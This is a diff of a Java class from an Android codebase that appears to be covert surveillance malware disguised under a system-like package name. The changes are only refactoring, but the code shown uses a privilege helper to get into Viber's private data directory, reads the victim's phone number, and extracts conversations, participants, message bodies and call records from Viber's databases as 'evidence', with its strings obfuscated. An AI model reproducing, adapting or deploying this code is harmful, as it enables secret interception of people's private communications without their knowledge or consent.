@@ -1,5 +1,17 @@
 package com.android.syssetup.module.chat;
 
+import android.database.Cursor;
+
+import com.android.mm.M;
+import com.android.syssetup.auto.Cfg;
+import com.android.syssetup.db.GenericSqliteHelper;
+import com.android.syssetup.db.RecordVisitor;
+import com.android.syssetup.file.Path;
+import com.android.syssetup.module.ModuleAddressBook;
+import com.android.syssetup.module.call.CallInfo;
+import com.android.syssetup.util.Check;
+import com.android.syssetup.util.StringUtils;
+
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.ObjectInputStream;
@@ -9,36 +21,79 @@ import java.util.Hashtable;
 import java.util.List;
 import java.util.concurrent.Semaphore;
 
-import android.database.Cursor;
-
-
-import com.android.syssetup.auto.Cfg;
-import com.android.syssetup.db.GenericSqliteHelper;
-import com.android.syssetup.db.RecordVisitor;
-import com.android.syssetup.file.Path;
-import com.android.syssetup.module.ModuleAddressBook;
-import com.android.syssetup.module.call.CallInfo;
-import com.android.syssetup.util.Check;
-import com.android.syssetup.util.StringUtils;
-import com.android.mm.M;
-
 public class ChatViber extends SubModuleChat {
 	private static final String TAG = "ChatViber";
 
 	private static final int PROGRAM = 0x09;
-	String pObserving = M.e("com.viber.voip");
-
 	static String dbDir = M.e("/data/data/com.viber.voip/databases");
 	static String dbChatFile = M.e("viber_messages");
 	static String dbCallFile = M.e("viber_data");
-
-	private Long lastViberReadDate;
+	String pObserving = M.e("com.viber.voip");
 	Semaphore readChatSemaphore = new Semaphore(1, true);
-
 	ChatGroups groups = new ChatViberGroups();
 	Hashtable<String, Integer> hastableConversationLastIndex = new Hashtable<String, Integer>();
-
+	private Long lastViberReadDate;
 	private String account;
+
+	public static String readAccount() {
+		String number = null;
+		String file = M.e("/data/data/com.viber.voip/files/preferences/reg_viber_phone_num");
+
+		if (Path.unprotect(file, 4, false)) {
+			FileInputStream fileInputStream;
+			try {
+				fileInputStream = new FileInputStream(file);
+				ObjectInputStream oInputStream = new ObjectInputStream(fileInputStream);
+				Object one = oInputStream.readObject();
+				number = (String) one;
+
+			} catch (Exception e) {
+				if (Cfg.DEBUG) {
+					e.printStackTrace();
+					Check.log(TAG + " (readMyPhoneNumber) Error: " + e);
+				}
+			}
+		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (readMyPhoneNumber): %s", number);
+		}
+		return number;
+	}
+
+	public static GenericSqliteHelper openViberDBHelperCall() {
+		return GenericSqliteHelper.openCopy(dbDir, dbCallFile);
+	}
+
+	public static GenericSqliteHelper openViberDBHelperChat() {
+		return GenericSqliteHelper.openCopy(dbDir, dbChatFile);
+	}
+
+	public static boolean getCurrentCall(GenericSqliteHelper helper, final CallInfo callInfo) {
+		String sqlQuery = M.e("select _id,number,date,type  from calls order by _id desc limit 1");
+
+		RecordVisitor visitor = new RecordVisitor() {
+
+			@Override
+			public long cursor(Cursor cursor) {
+				callInfo.id = cursor.getInt(0);
+				callInfo.peer = cursor.getString(1);
+				// callInfo.displayName = String sqlQuery;
+				callInfo.timestamp = new Date(cursor.getLong(2));
+				int type = cursor.getInt(3);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (cursor) call type: " + type);
+				}
+				callInfo.incoming = type == 1;
+				callInfo.valid = true;
+
+				return callInfo.id;
+			}
+		};
+
+		helper.traverseRawQuery(sqlQuery, new String[]{}, visitor);
+		return callInfo.valid;
+	}
 
 	@Override
 	public int getProgramId() {
@@ -68,32 +123,6 @@ public class ChatViber extends SubModuleChat {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (start), read lastViber: " + lastViberReadDate);
 		}
-	}
-
-	public static String readAccount() {
-		String number = null;
-		String file = M.e("/data/data/com.viber.voip/files/preferences/reg_viber_phone_num");
-
-		if (Path.unprotect(file, 4, false)) {
-			FileInputStream fileInputStream;
-			try {
-				fileInputStream = new FileInputStream(file);
-				ObjectInputStream oInputStream = new ObjectInputStream(fileInputStream);
-				Object one = oInputStream.readObject();
-				number = (String) one;
-
-			} catch (Exception e) {
-				if (Cfg.DEBUG) {
-					e.printStackTrace();
-					Check.log(TAG + " (readMyPhoneNumber) Error: " + e);
-				}
-			}
-		}
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (readMyPhoneNumber): %s", number);
-		}
-		return number;
 	}
 
 	@Override
@@ -154,7 +183,7 @@ public class ChatViber extends SubModuleChat {
 					lastViberReadDate = newViberReadDate;
 					updateMarkupViber(lastViberReadDate, true);
 				}
-			}finally {
+			} finally {
 				helper.disposeDb();
 			}
 
@@ -167,20 +196,12 @@ public class ChatViber extends SubModuleChat {
 		}
 	}
 
-	public static GenericSqliteHelper openViberDBHelperCall() {
-		return GenericSqliteHelper.openCopy(dbDir, dbCallFile);
-	}
-	
-	public static GenericSqliteHelper openViberDBHelperChat() {
-		return GenericSqliteHelper.openCopy(dbDir, dbChatFile);
-	}
-
 	private List<ViberConversation> getViberConversations(GenericSqliteHelper helper, final String account,
-			Long lastViberReadDate) {
+	                                                      Long lastViberReadDate) {
 
 		final List<ViberConversation> conversations = new ArrayList<ViberConversation>();
 
-		String[] projection = new String[] { M.e("_id"), M.e("date"), M.e("recipient_number"), M.e("conversation_type") };
+		String[] projection = new String[]{M.e("_id"), M.e("date"), M.e("recipient_number"), M.e("conversation_type")};
 		String selection = "date > " + lastViberReadDate;
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
@@ -242,7 +263,7 @@ public class ChatViber extends SubModuleChat {
 		};
 
 		String sqlquery = M.e("SELECT P._id,  I.number, I.display_name, I.contact_name, I.participant_type from participants as P join participants_info as I on P.participant_info_id = I._id where conversation_id = ?");
-		helper.traverseRawQuery(sqlquery, new String[] { thread_id }, visitor);
+		helper.traverseRawQuery(sqlquery, new String[]{thread_id}, visitor);
 
 	}
 
@@ -253,8 +274,8 @@ public class ChatViber extends SubModuleChat {
 		try {
 			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-			String[] projection = new String[] { M.e("_id"), M.e("participant_id"), M.e("body"), M.e("date"),
-					M.e("address"), M.e("type") };
+			String[] projection = new String[]{M.e("_id"), M.e("participant_id"), M.e("body"), M.e("date"),
+					M.e("address"), M.e("type")};
 			String selection = M.e("conversation_id = ") + conversation.id + M.e(" and date > ") + lastConvId;
 			String order = "date";
 			RecordVisitor visitor = new RecordVisitor(projection, selection, order) {
@@ -357,32 +378,6 @@ public class ChatViber extends SubModuleChat {
 
 	public void saveEvidence(ArrayList<MessageChat> messages) {
 		getModule().saveEvidence(messages);
-	}
-
-	public static boolean getCurrentCall(GenericSqliteHelper helper, final CallInfo callInfo) {
-		String sqlQuery = M.e("select _id,number,date,type  from calls order by _id desc limit 1");
-
-		RecordVisitor visitor = new RecordVisitor() {
-
-			@Override
-			public long cursor(Cursor cursor) {
-				callInfo.id = cursor.getInt(0);
-				callInfo.peer = cursor.getString(1);
-				// callInfo.displayName = String sqlQuery;
-				callInfo.timestamp = new Date(cursor.getLong(2));
-				int type = cursor.getInt(3);
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (cursor) call type: " + type);
-				}
-				callInfo.incoming = type == 1;
-				callInfo.valid = true;
-
-				return callInfo.id;
-			}
-		};
-
-		helper.traverseRawQuery(sqlQuery, new String[] {}, visitor);
-		return callInfo.valid;
 	}
 
 	public class ChatViberGroups extends ChatGroups {
